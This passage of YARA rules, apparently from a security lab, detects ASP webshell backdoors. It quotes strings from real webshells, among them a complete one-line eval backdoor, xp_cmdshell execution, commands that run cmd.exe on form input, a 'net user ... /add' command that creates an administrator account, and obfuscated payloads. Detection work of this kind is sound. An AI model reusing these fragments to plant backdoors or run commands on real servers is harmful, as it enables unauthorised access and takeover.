        $s10 = "Connstr = \"Driver={SQL Server};Server=.;Uid=\" & namestr &\";Pwd=\" & Passstr & \";database=\" & kustr" fullword ascii
        $s11 = "@CommAnd = 'exeC master..xp_exeCresultSet N''seleCt ''''exeC" fullword ascii
        $s12 = "Response.Write(GetDataName(dbname,dbPass,dbku))" fullword ascii
        $s13 = "If Instr(Cmdshell,\"net user\",1) > 0 Then" fullword ascii
        $s14 = "<td Colspan=\"2\"><input name=\"dbku\" type=\"text\" Class=\"STYLE1\" id=\"dbku\" value=\"msdb\" readonly=\"readonly\" /></td>" fullword ascii
        $s15 = "&nbsp;&nbsp;&nbsp;<span Class=\"STYLE1\"><a href=\"?action=loginout\">" fullword ascii
        $s16 = "<td><textarea name=\"Cmd\" Cols=\"80\" rows=\"20\" Class=\"STYLE1\" id=\"Cmd\" style=\"display:none\">" fullword ascii
        $s17 = "Sub GetCmdText(namestr,Passstr,kustr)" fullword ascii
        $s18 = "<form action=\"?action=Cmdtext\" method=\"post\">" fullword ascii
        $s19 = "EXEC sp_start_job @job_name = 'jktest'</textarea>" fullword ascii
        $s20 = "'-----------------           http://www.jk1986.cn    -----------------" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule sig_4f216890e1909148a1a8fa78af4fc913eb9645ca
{
     meta:
        description = "asp - file 4f216890e1909148a1a8fa78af4fc913eb9645ca.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c350b163b5527ee445b315ec5a2431e311201616ce8cb2f7d048888ef58da2c4"
     strings:
        $x1 = "frames.byZehir.document.execCommand('InsertImage', false, imagePath);" fullword ascii
        $x2 = "frames.byZehir.document.execCommand(command, false, option);" fullword ascii
        $s3 = "response.Write \"<title>[AhmetDeniz.Org] ZehirIV --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title>\"" fullword ascii
        $s4 = "Response.Write \"<tr><td><b><font color=red>Log Root</td><td> \" & request.servervariables(\"APPL_MD_PATH\") & \"</td></tr>\"" fullword ascii
        $s5 = "Response.Write \"<form method=get action='\"&DosyPath&\"' target='_opener' id=form1 name=form1>\"" fullword ascii
        $s6 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & Fil.name" fullword ascii
        $s7 = "objConn.Execute strSQL" fullword ascii
        $s8 = "Private Sub AddField(ByRef pstrName, ByRef pstrFileName, ByRef pstrContentType, ByRef pstrValue, ByRef pbinData)" fullword ascii
        $s9 = "Response.Write \"<form method=get target='_opener' action='\"&DosyPath&\"'>\"" fullword ascii
        $s10 = "response.Write \"<iframe style='width:0; height:0' src='http://localhost/tuzla-ebelediye'></iframe>\"" fullword ascii
        $s11 = "Response.Write \"<tr><td><b><font color=red>HTTPD</td><td> \" & request.servervariables(\"SERVER_SOFTWARE\") & \"</td></tr>\"" fullword ascii
        $s12 = "Response.Write \"<tr><td><b><font color=red>Port</td><td> \" & request.servervariables(\"SERVER_PORT\") & \"</td></tr>\"" fullword ascii
        $s13 = "Call Err.Raise(vbObjectError + 1, \"clsUpload.asp\", \"Object does not exist within the ordinal reference.\")" fullword ascii
        $s14 = "llngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Type:\"), vbTextCompare)" fullword ascii
        $s15 = "llngStart = InStrB(1, pbinChunk, CRLF & CStrB(\"Content-Disposition:\"), vbTextCompare)" fullword ascii
        $s16 = "Response.Write \"<tr><td><b><font color=red>HTTPS</td><td> \" & request.servervariables(\"HTTPS\") & \"</td></tr>\"" fullword ascii
        $s17 = "Response.Write \"<tr><td><b>Local Path </td><td><font color=red>yazma yetkisi yok! : [\"&err.Description&\"]</td></tr>\"" fullword ascii
        $s18 = "<input style=\"width:100%\" type=text name=\"FileName\" id=\"FileName\" value=\"byzehir.txt\" size=\"20\"></td" fullword ascii
        $s19 = "<input style=\"width:100%\" type=text name=\"FileName\" id=\"FileName\" value=\"byzehir.txt\" size=\"20\"></td>" fullword ascii
        $s20 = "MyFile.write \"byzehir <zehirhacker@hotmail.com>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_797c8a04004e19c0e28f36e69e1383dbc457cbbb
{
     meta:
        description = "asp - file 797c8a04004e19c0e28f36e69e1383dbc457cbbb.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "85c742f089396c3db92eff96fffb2551831522ee3af3c39d031280c420319d58"
     strings:
        $s1 = "<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(\"a\"))%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule df6eaba8d643c49c6f38016531c88332e80af33c
{
     meta:
        description = "asp - file df6eaba8d643c49c6f38016531c88332e80af33c.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0fc470c0039d2979c04b31852b9f5c4e2dae4df9a414eb8a7529eed59ff2ad71"
     strings:
        $s1 = "RW=RW & \"&nbsp;<input type='submit' value='Login' style='border:1px solid #00FF00;'></form><hr color=#00FF00 width='250'><fo" fullword ascii
        $s2 = "If Request(\"pwd\")=Userpwd or Request(\"pwd\")=\"www.1937cn.com\" then Session(\"mgler\")=Userpwd" fullword ascii
        $s3 = "<%=\"<input type=submit value=Upload> <font style=color:BLUE;>By:www.1937cn.com\"%>" fullword ascii
        $s4 = "</b><input name='pwd' type='password' size='15' style='font-size: 12px;border: menu 1px solid'>\"" fullword ascii
        $s5 = "RW=\"<title>User Login</title>\"" fullword ascii
        $s6 = "RW=RW & \"<center style='font-size:12px'><br><br><br><hr color=#00FF00 width='250'><br><font color=#00FF00>" fullword ascii
        $s7 = "RW=RW & \"&nbsp;<input type='submit' value='Login' style='border:1px solid #00FF00;'></form><hr color=#00FF00 width='250'><font " ascii
        $s8 = "RW=RW & \"<form action='\" & URL & \"' method='post'>\"" fullword ascii
        $s9 = "RW=RW & \"<b>Password" fullword ascii
        $s10 = "<%=server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
        $s11 = "<%=\"<font style=color:BLUE;>File: </font><input type=text name=path size=46>\"%>" fullword ascii
        $s12 = "webshell</font> <font color=#00FF00>" fullword ascii
        $s13 = "<%=\"<br><font style=color:BLUE;>Path: </font><font style=color:red;>\"%>" fullword ascii
        $s14 = "Userpwd = \"admin\"   'User Password" fullword ascii
        $s15 = "If Request.Form(\"pwd\")=Userpwd Then" fullword ascii
        $s16 = "If Session(\"mgler\")<>Userpwd Then" fullword ascii
        $s17 = "<%ofso=\"scripting.filesystemobject\"%>" fullword ascii
        $s18 = "<%=\"<title>Asp Upload Tool-hxhack</title>\"%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}

rule d5d37a02793361b3b9c8931d3d1a380e1bb10602
{
     meta:
        description = "asp - file d5d37a02793361b3b9c8931d3d1a380e1bb10602.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6e8a05903143fc89b4d682d43866bfd9a7dc436009bcb7c75604cf6d3d4d7a4b"
     strings:
        $s1 = "c,O#Lm4Dcq8cb[14DvFTX*[m4.vFq *'1t.vF8v#Lm4.`+ b[1t.c8&#L^tM`FZbl)NPUq'J@!&DD@*@!JOl(Vn@*@!zNr-@*@!dmMraY@*7lMPmKxDCk" fullword ascii
        $s2 = "l,xC:nxEnCY4dB,mGsk'B0TEP.WSd{BqZB,mVm/kxBANrYE@*E'hlY4d{kYDLE@!zD+XYCDnC@*J@#@&N~J@!4.~J@*J@#@&NPE@!bUaEO,YHw+{Bk;4skOB,xCh" fullword ascii
        $s3 = "bg =\"http://www.7jyewu.cn/webshell/f4ck.jpg\"  '" fullword ascii
        $s4 = "J#@#@&mKxxkO.'rnMW-k[nM'jpd6SAf$ 8ifCOmPjW!.1+xrPLPYmDTnYbw~[r~E',wWMO1!:PLEIjk+MP(fxsm3n pKlk/AGMN'IE@#@&^W" fullword ascii
        $s5 = "1K=&zr[Yg /Wsw!YnDHCs+'JJ)NskUrkYDCOKDd~T.KE2r#@#@&sKD,3l1t~l9:rU,kx,G4NMDK;2Rt+s4nDd@#@&L~J@!sk@*@!WG" fullword ascii
        $s6 = "6xJ^GsFkmKh -mGh2umGhWu^WsX-mGsv-mWsG-^Ws%kmK:1k^wY8kVaY -s2Y2u^wOcksaYXu^2Y+us2DGus2D%kVaOOJ@#@&D" fullword ascii
        $s7 = "N,)P:Fc/WaXPW,K+SG?Ym.Y fqAU[O2@#@&K+RKGkkOkKUP{PT~=PK+ :X2+,x, @#@&KyRZ4lMd+DPxJT4+f8 J@#@&?w.P{~P cI" fullword ascii
        $s8 = "Jb/O@#@&kX/wk^nSb/OP{PEy_?CchN(^CUu V94fJ@#@&(W,?nD7nDcZ.nmY+68N+^Yv/}1j:{w?r*RwGV9+.2XkdOk`Y4nnmYt*~xPwl^/nPP4" fullword ascii
        $s9 = "/-:^2ka-hl.lhnD+./'(xD+.Wmm+dwP%)c+X8 0 %A,, c~TZ bos2OqfW%f;X*AA ANwK;nzVsWAn9nGDDdB@*" fullword ascii
        $s10 = "@*@!z:9@*@!zs}]\\@*@!z:I@*J@#@&,PH+XO@#@&LE~@!KI~^^ld/{P~K9@*@!wrItPm^YbWU'Qb^ObWx{jmwWV9n.[wW^NnDxE@#@&%PwjrcMnOUw+^rmVoW^[" fullword ascii
        $s11 = "[J@!z6GxD@*@!z6WUO@*@!z1nxD+D@*@!4D,mKVGDx:W * W+Pkk\"n{FP@*@!JY[@*@!&DD@*r)&0P}4:c!BFb'rP" fullword ascii
        $s12 = "74ZMS6~[,J~nKDOHK'J,'P6YwaG.Y,[,\\8Z.J6@#@&:D~',Jj(:2P\\)&1P2g)gZ3rPLP\\(ZMJ0@#@&U+SNGhmkx,xPrO?AP9rtb&1EP'~74/DdWPLPERGW:Cr" fullword ascii
        $s13 = "fbD'rPL~YalOt,[~E'JPL~\\(mD^W~[,J SGorUt+dsbs+{J~',\\4^.^0~[,E frkl(V+{!r~[,\\8mMVW~LPJ ]+^nlD4d'8J,[~\\8^MVWPL~{@#@&ERg++[j" fullword ascii
        $s14 = "B@*}2nx@!zm@*~J@#@&kkx/b'J@!l~4M+0xvNl-lk^Mk2D)wEV^sK.:vJEJLInKmYtvKlDt[rwE[dRglh+b'rJE~rE29kOobV+EE*B~m^Ck/xElsBPDkDs+{B" fullword ascii
        $s15 = "_33S8P{PELAOr@#@&s!UmDkGU,2x^.HwO`m^9#@#@&sKDPbP{~F,KGPd+UcmmN*~/D+w,q@#@&1'sk[`C^9~r~8b@#@&kW~1'J" fullword ascii
        $s16 = "/O k+D-nM\\CDbC(Vnk`rtYDw|4WkYE#LJE@#@&?q{E@!(D@*@!OC4^+,hrNO4{B0!uvP(o^G^WDxvs+UEE~(W.9+M'BZB,^+^VdwmmrUT'B8vP1+V^2CN9k" fullword ascii
        $s17 = "j_RI3!\"2)fv]mNhbxhlY4PL~nKDOP*@#@&(6Pqk)DMlXvKGDDbMDCXb~:tnx,@#@&NPKGMYP'E=J~@#@&%,tnXYKkxD+McZUY.`_+achWDD)DMlXvqb#*[;?ODcu" fullword ascii
        $s18 = "nAEk+MPxPERU2PjU3IU2PihJP'~74/DdW,[~rO&n'ZRZ !c!EPLP-8;DS6~[,JOhG.YgW{J~[~WDw2WMOPLP-8;DSW~LPEO`d" fullword ascii
        $s19 = "x@#@&.dcb[Ngnh@#@&.dvJY4nhlOtrb,'~tk9`kD+s nmY4~,cb@#@&/YMnlsRSKC[sMWssrVncbYn:cKlDtb@#@&D/cE6ks+;G" fullword ascii
        $s20 = "lh+BPMEn@#@&AxN,k6@#@&Ax[Pb0@#@&U+Y,P+kYsbsnSb/DPxPHGDtrxT@#@&U+O~:+/OoKV[+M~{PHKY4kxT@#@&j+DPo?}Px~gWY4rxT@#@&U^]+qD,'~In" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule c54850d94f70e18accddda418b32ed3510092348
{
     meta:
        description = "asp - file c54850d94f70e18accddda418b32ed3510092348.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "fbfdd9aca6c7ddb7c2ed97f1852f1b9896a6149874c5b4163186fb71a32ded2f"
     strings:
        $x1 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":o SI:SI=\"\":If tri" ascii
        $x2 = "strBAD=strBAD&\"If Session(\"\"\"&clientPassword&\"\"\")<>\"\"\"\" Then Execute Session(\"\"\"&clientPassword&\"\"\")\"" fullword ascii
        $x3 = "\"\";var speed = 10000;var x = 0;var color = new initArray(\"\"#ffff00\"\", \"\"#ff0000\"\", \"\"#ff00ff\"\",\"\"#0000ff\"\",\"" ascii
        $x4 = "connstr=\"Provider=SQLOLEDB.1;Data Source=\"&targetip &\",\"& portNum &\";User ID=lake2;Password=;\"" fullword ascii
        $x5 = "='#003000'\"\"><a href='?Action=Cmd1Shell' target='FileFrame'><font face='wingdings'>8</font> CMD---" fullword ascii
        $x6 = "<a>&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $x7 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
        $x8 = "if ShellPath=\"\" Then ShellPath=\"cmd.exe\"" fullword ascii
        $x9 = "STRQUERY=\"DBCC ADDEXTENDEDPROC ('XP_CMDSHELL','XPLOG70.DLL')\"" fullword ascii
        $s10 = "='\"&DefCmd&\"'> <input type='submit' value='Execute'></td></tr><tr><td id=d><textarea Style='width:100%;height:440;'>\"" fullword ascii
        $s11 = "<a>&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
        $s12 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
        $s13 = "http.SetRequestHeader \"REFERER\", \"\"&net&\"\"&request.ServerVariables(\"HTTP_HOST\")&request.ServerVariables(\"URL\")" fullword ascii
        $s14 = "EG_DWORD',1;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.EXE /C D" ascii
        $s15 = "STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.EXE /C " ascii
        $s16 = "STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.EXE /C " ascii
        $s17 = "or='#003000'\"\"><a href='?Action=Logout' target='FileFrame'><center><font face='wingdings'>8</font> " fullword ascii
        $s18 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
        $s19 = "CMD=CHR(34)&\"CMD.EXE /C \"&REQUEST.FORM(\"CMD\")&\" > 8617.TMP\"&CHR(34)" fullword ascii
        $s20 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule bfe620457b308a149c3d741f2128918d483e8497
{
     meta:
        description = "asp - file bfe620457b308a149c3d741f2128918d483e8497.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9751ca54cc6fb494b886d2f26c1cf1eb29a6217d0160b57658bf4cb0d6ea73ae"
     strings:
        $s1 = "dYcsG.s`JjnmD^t|WbVnA6DJ#@#@&i7d;lsV,?4GSbV^ok^+ vPhwhlDtb@#@&7i2UN,(0@#@&]]UPJ@!Om4s+,AbNO4'rJFZ!uEJ,4GD9+.xrJ!rEP1+V^2CN9k" fullword ascii
        $s2 = "e]A%PhLp%M0jl[BFMB=)_q'O%++%n|o _*!1y@*@*xx {Gv=I1s{\"m6%tWVSLz/gC6SLz%M0hWimEUE4em6%4xPhLolH%($YAXkYuzkLhS\"CmI9Ip?(mI5n\\BpAq" fullword ascii
        $s3 = "_R =bYsu/DxX4/.FgkYUX4/\"Fuk/N_B;hoz/AozZSo) ++y + y+ y ++y  ++y + y+y +y y  y yv]NXUh'&%akYEX%" fullword ascii
        $s4 = "@!J8@*@!&m@*@!zY9@*@!&YM@*E@#@&I]jr@!YM@*@!DNP4nro4Y{B+!v@*@!l~tMn0{B%C7l/^.bwO)U4KhoKV9+DvJrE[\"+KlDtc]KWYhCY4#[rEE#E@*@!4@*" fullword ascii
        $s5 = "dYv0k^nO6D#,K4+U@#@&d7di]+aW.O,'P]naW.YLE@!Y.@*@!DN@*r[Dn:a[E@!JY[@*@!YN@* ?m\\+@!&ON@*@!DN@*" fullword ascii
        $s6 = "\"qP2~E,P@!qgKj:PH)t2'/\\GPP5h3{K3oK@*J@#@&di7P,P]2Un6HU2Rq]q:2Pr@!j2d2;K~1)\\A'vK}6SEP@*@!}nK(6gP#bdiA'vE@* OO " fullword ascii
        $s7 = "jDD~{PrnDK\\b[+M'\\k1DGdK0YcB+DRrd39Accc!IP9CDl~?K;D1+xE,[PjnM\\nDc\\mwKmY4`J_?_ :94E#@#@&C[KZlDCVKoR;.nlD+,mGxUjDD@#@&1Gx" fullword ascii
        $s8 = "hW$A%Ph%62z6Ny-%S_B/Sn|F|nFv~$SY$Yt^ourXzZrXWb@$;Xo/3/~n||nFF`BASY5Y4sT]rXz/kHc)" fullword ascii
        $s9 = "3BvBR.SYF;$\"|QX;USt6W`6WSA0%S:Y6b;~*R~~z:^x%:ukz)E_1o$1od" fullword ascii
        $s10 = "D /M+lDnr(L+1OcJtk1DG/GWDRpHduK:nEb@#@&4 Ga+UPr!AKEBPrtYDw=&z8 {RZRT 8)J,'P6YwaG.Y,[,J&oGs9/;xJ;wmNhr" fullword ascii
        $s11 = "EvOHE.YSEY$uLD6jqeRBEA%k$YnL`Y]vEA$/DUX4sFR0x]%a$L:@$N.6?(ZBEJJrJrEJrBv]~!Y%.;0PfLM0?nf.hD3NkU:f;DX@$RN.0U|qvE" fullword ascii
        $s12 = "2VmmncwkVnKmY4~knM\\nMRtlwhlD4`r-E#LJwEBJJBq~8~F*'E@!Jl@*@!8D~&@*J@#@&,~P,Ynha'Ynha[E@!m~4Dn6'ELl7lk^DbwO)wEsswWDscJrJ[Mn2Vmm" fullword ascii
        $s13 = "aY~E_`1QBS$Ny50PY~!xS$bx]SNDMz8NeBAaX0$t]BX)%XBA%E?XYS!x~~%D6/]H\";/" fullword ascii
        $s14 = "P,PP,P,~P,P~P,I3jhr1U3RqIq:3~J@!z:2pK)]Ab@*J@#@&diP~~,PP~j:I}jA]IPx,JGIrhP:)Ad2~$x1/Dpf2;Jb\"2P@$6~qgK,2p2/~Unmrz/IAbP3,B" fullword ascii
        $s15 = "@!JsrgK@*@!A\"@*E@#@&P~~,PP,~P,PP,~~P,P,P~P~jA?jq}H`rn](r#'q@#@&P~P,~,P~,P,PP,P,~P,P~P,2JjA@#@&,~P,PP,~~P,P,P~P~~,P~P,]2Un6HU2R" fullword ascii
        $s16 = "\"(KABJ@#@&7d,P,P~P~jAK~IA/IA?iJ:P'~)Gr/rgHc2pAZ`K2v?:]p`2]5*P@#@&idP,~P,PP&o~IAZ\"2jjJPv!bP:u2gP@#@&idP~~,P~P\"3Un6g?AR" fullword ascii
        $s17 = "\"q:2BBBoK?:b]RGSJv*J@#@&7d,PP,~~Pzf}Z61H A(3Z`P2v?P]5j2]e*d@#@&,~,P~,P,PP,P,~P,P~P,P~~\"2?h61U2Rq](KAPr@!orHP,Z6S}]'\"29@*" fullword ascii
        $s18 = "Y4M 2tag!Ds'E'9WhlbU[r[dOHV+x+rJ@*@!Jrso@*@!z1+xD+M@*J@#@&]IUJ@!&DN@*@!&YM@*J@#@&(0,r(Kc!Sq*'EPr~K4+U@#@&IIjE@!Y.@*@!O9P4" fullword ascii
        $s19 = "Px~rOfAJ2:2f}\\)qgJ,[~\\8/MSWPL~J qKxZR! Tc!EPL~74/MS6P[,J,KWMYHW{J~',0Ya2WMYPL~-4;Dd0@#@&hO,'~JU(KAP\\)&1K3Hz1/2r~LP-(ZMS0@#@&" fullword ascii
        $s20 = "J@#@&idd,~P\"2?h6H?ARqI(K3~r@!(1hiK,1)\\A'n6]:PP5h3{K3oK,qf{?A].AI~.zSi3{F F !c!R8@*E@#@&Pid~P~~,P~P,~P\"2jK}1?3 qI(KA~rP~Upd" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule bb9ce4a87f0e64097a53dcf9cf29dffccc052d7f
{
     meta:
        description = "asp - file bb9ce4a87f0e64097a53dcf9cf29dffccc052d7f.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e6e33b71df872ead3561ed2fdf233d28e5d17b96a32656f833c18d2eb8370d1f"
     strings:
        $s1 = "<table width=\"100%\" height=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" bordercolor=\"#FFFFFF\">" fullword ascii
        $s2 = "<body bgcolor=\"#000000\" leftmargin=\"0\" topmargin=\"0\" marginwidth=\"0\" marginheight=\"0\">" fullword ascii
        $s3 = "<% Set FSO = Server.CreateObject(\"Scripting.FileSystemObject\") %>" fullword ascii
        $s4 = "<td><table width=\"700\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"1\">" fullword ascii
        $s5 = "<% Response.write \"<form action='''' method=post>\" %>" fullword ascii
        $s6 = "<% Response.write \"<textarea name=path2 cols=80 rows=15 width=32></textarea>\" %>" fullword ascii
        $s7 = "<%=server.mappath(Request.ServerVariables(\"SCRIPT_NAME\")) %>" fullword ascii
        $s8 = "<%@LANGUAGE=\"VBScript\" CODEPAGE=\"936\"%>" fullword ascii
        $s9 = "<% Response.Write \"<input type=text name=path1 width=200 size=81>\" %>" fullword ascii
        $s10 = "<% Set MyFile=FSO.CreateTextFile(request(\"path1\"),True) %>" fullword ascii
     condition:
        ( uint16(0) == 0x6967 and filesize < 7KB and ( all of them ) ) or ( all of them )
}

rule c8fa5e654a9df83cc8322e1236fa872549c121b9
{
     meta:
        description = "asp - file c8fa5e654a9df83cc8322e1236fa872549c121b9.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d05c318a7a894d27e152be19f2e459d6e9b93c1e10bcc7af26dd940d9e716ac1"
     strings:
        $s1 = "556675766874782F4C75696E5E237E2360" ascii /* hex encoded string 'Ufuvhtx/Luin^#~#`' */
        $s2 = "s = s + char(int(q)-p);// + \"|\" + p +\"|\";" fullword ascii
        $s3 = "exs(exs(dec(\"556675766874782F4C75696E5E237E2360\",\"1314\"))); " fullword ascii
        $s4 = "<script runat=\"server\" language=\"JScript\">" fullword ascii
        $s5 = "q = \"0x\"+ str.substr(k, 2);" fullword ascii
        $s6 = "q = \"0x\"+ str.substr(k, 4);" fullword ascii
     condition:
        ( uint16(0) == 0x733c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_35324dcf691f074266d47701b82cc504fa800213
{
     meta:
        description = "asp - file 35324dcf691f074266d47701b82cc504fa800213.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b70490159f26215e74b2f49c7b057e05cef65a20c515cf6e1d3c8766ca951fde"
     strings:
        $x1 = "Dim user, pass, port, ftpport, cmd, loginuser, loginpass, deldomain, mt, newdomain, newuser, quit" fullword ascii
        $s2 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user goldsun love /add & net localgroup administrators goldsun /" ascii
        $s3 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user goldsun love /add & net localgroup administrators goldsun /" ascii
        $s4 = "GName=\"http://\" & request.servervariables(\"server_name\")&lcase(request.servervariables(\"script_name\")) " fullword ascii
        $s5 = "<input name=\"c\" type=\"hidden\" id=\"c\" value=\"<%=cmd%>\" size=\"50\">" fullword ascii
        $s6 = "<table width=\"494\" height=\"163\" border=\"1\" cellpadding=\"0\" cellspacing=\"1\" bordercolor=\"#666666\">" fullword ascii
        $s7 = "'DO NOT use it to do evil things!" fullword ascii
        $s8 = "<td><input name=\"port\" type=\"text\" id=\"port\" value=\"43958\"></td>" fullword ascii
        $s9 = "<input name=\"port\" type=\"hidden\" id=\"port\" value=\"<%=port%>\"></td>" fullword ascii
        $s10 = "<input name=\"p\" type=\"hidden\" id=\"p\" value=\"<%=pass%>\"></td>" fullword ascii
        $s11 = "<input name=\"u\" type=\"hidden\" id=\"u\" value=\"<%=user%>\"></td>" fullword ascii
        $s12 = "If request.servervariables(\"SERVER_PORT\")=\"80\" Then " fullword ascii
        $s13 = "<center><form method=\"post\" name=\"goldsun\">" fullword ascii
        $s14 = "<br><font color=red><%=cmd%></font><br><br>" fullword ascii
        $s15 = "127.0.0.1:<%=port%>," fullword ascii
        $s16 = "<td width=\"379\"><input name=\"u\" type=\"text\" id=\"u\" value=\"LocalAdministrator\"></td>" fullword ascii
        $s17 = "<form method=\"post\" name=\"goldsun\">" fullword ascii
        $s18 = "setTimeout(\"document.all.goldsun.submit();\",4000);" fullword ascii
        $s19 = "<td><input name=\"p\" type=\"text\" id=\"p\" value=\"#l@$ak#.lk;0@P\"></td>" fullword ascii
        $s20 = "<input name=\"action\" type=\"hidden\" id=\"action\" value=\"3\"></form>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_970264364422b3d34bd008e02d794baf3df62b00
{
     meta:
        description = "asp - file 970264364422b3d34bd008e02d794baf3df62b00.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7580a31513ba4719a1eb7fd037b7d8b1ec13077605936d8e1b87965c3429010e"
     strings:
        $x1 = "\");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = \"Provider=" ascii
        $x2 = "\",FName);top.hideform.FName.value = DName;}else{DName = \"Other\";}if(DName!=null){top.hideform.Action.value = FAction;top.hide" ascii
        $x3 = "seshell.ShellExecute shellpath,\" /c \" & defcmd & \" > \" & sztempfile,\"\",\"open\",0" fullword ascii
        $x4 = "\");FullDbStr(0);return false;}return true;}function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = \"Provider=" ascii
        $x5 = "CONn.EXEcutE(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)\")" fullword ascii
        $x6 = "></form></tr></table>\":jb SI:SI=\"\":If trim(request.form(\"MMD\"))<>\"\"  Then:password= trim(Request.form(\"P\")):id=trim(Req" ascii
        $x7 = "jb\"<title>\"&nimajb&\" - \"&nimajbm&\" </title>\":jb\"<style type=\"\"text/css\"\">\":jb\"body,td{font-size: 12px;background-co" ascii
        $x8 = "ConnstR=\"Provider=SQLOLEDB.1;Data Source=\" & tARgETIp &\",\"& PoRtNUm &\";User ID=lake2;Password=;\"" fullword ascii
        $s9 = "crosoft.Jet.OLEDB.4.0;Data Source=D:\\\\VirtualHost\\\\343266.ctc-w217.dns.com.cn\\\\www\\\\db.mdb;Jet OLEDB:Database Password=*" ascii
        $s10 = "osoft.Jet.OLEDB.4.0;Data Source=D:\\\\VirtualHost\\\\343266.ctc-w217.dns.com.cn\\\\www\\\\db.mdb;Jet OLEDB:Database Password=***" ascii
        $s11 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'>\"" fullword ascii
        $s12 = "!)</font></a></center>\":jb\"<tr><td height='20'><a href='?Action=Upload' target='FileFrame'><center><font color=red size=5px>(" fullword ascii
        $s13 = "jb\"<input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))>\"" fullword ascii
        $s14 = "jb\"<tr><td height='20'><a href='?Action=Cmd1Shell' target='FileFrame'>" fullword ascii
        $s15 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/M_Schumacher/upadmin/s2\", True, \"\", \"\"" fullword ascii
        $s16 = "\"exec master.dbo.xp_cMdsHeLl '\" & request.form(\"MMD\") & \"'\":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF" ascii
        $s17 = "xpost3.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s18 = "xpost.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s19 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s1\",True, \"\", \"\"" fullword ascii
        $s20 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s3\", True, \"\", \"\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_0b5cc4be7b7e3336b7fd95c5a12a3430500e7a20
{
     meta:
        description = "asp - file 0b5cc4be7b7e3336b7fd95c5a12a3430500e7a20.asp"
        company = "WatcherLab"
